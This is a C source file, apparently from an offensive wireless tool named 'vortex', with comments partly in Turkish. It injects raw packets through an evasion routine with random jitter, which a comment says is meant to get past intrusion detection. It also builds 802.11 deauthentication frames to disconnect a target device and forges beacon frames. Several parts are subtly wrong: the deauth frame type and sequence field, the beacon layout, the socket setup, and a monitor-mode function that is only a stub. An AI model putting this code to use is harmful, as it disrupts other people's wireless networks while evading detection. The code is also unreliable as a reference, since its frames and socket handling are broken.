#include "vortex_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

// Internal helper for microseconds sleep
void usleep_custom(uint64_t microseconds) {
    struct timespec ts;
    ts.tv_sec = microseconds / 1000000;
    ts.tv_nsec = (microseconds % 1000000) * 1000;
    nanosleep(&ts, NULL);
}

int vortex_inject_packet(const uint8_t* packet, size_t length) {
    // Mükemmel performans için RAW socket kullanımı
    int sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket error");
        return -1;
    }

    struct sockaddr_ll socket_address = {0};
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ALL);

    // Evasion Uygulama: Paketi önce Rust engine'ine gönderiyoruz
    uint8_t* mutable_packet = malloc(length);
    memcpy(mutable_packet, packet, length);

    vortex_apply_evasion(mutable_packet, length);

    // Jitter uygulama: Rastgele gecikme ekleyerek IDS'leri atlatıyoruz
    usleep_custom(vortex_get_jitter_delay());

    if (sendto(sock, mutable_packet, length, 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("Sendto error");
        free(mutable_packet);
        close(sock);
        return -1;
    }

    free(mutable_packet);
    close(sock);
    return 0;
}

bool vortex_set_monitor_mode(const char* interface, bool enable) {
    printf("[Core] Setting %s to monitor mode: %s\n", interface, enable ? "ON" : "OFF");
    return true;
}

int vortex_gen_deauth_packet(const uint8_t* target_mac, const uint8_t* ap_mac, uint8_t* packet_out) {
    // 802.11 Deauth Frame
    uint8_t frame[] = {
        0x00, 0x00, // Frame Control: Deauthentication
        0x00, 0x00, // Duration
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // Receiver
        ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5], // Source
        ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5], // BSSID
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sequence
        0x00, 0x00, // Reason code: 0 (Not specified)
    };
    memcpy(packet_out, frame, sizeof(frame));
    return 0;
}

int vortex_gen_beacon_packet(const uint8_t* ap_mac, const uint8_t* ssid, size_t ssid_len, uint8_t* packet_out) {
    // Basic 802.11 Beacon Frame (Simplified)
    uint8_t frame[256] = {0};
    frame[0] = 0x80; // Beacon
    memcpy(&frame[4], ap_mac, 6); // Source
    memcpy(&frame[10], ap_mac, 6); // BSSID

    // SSID element
    frame[24] = 0; // Element ID: SSID
    frame[25] = (uint8_t)ssid_len;
    memcpy(&frame[26], ssid, ssid_len);

    memcpy(packet_out, frame, 26 + ssid_len);
    return 0;
}
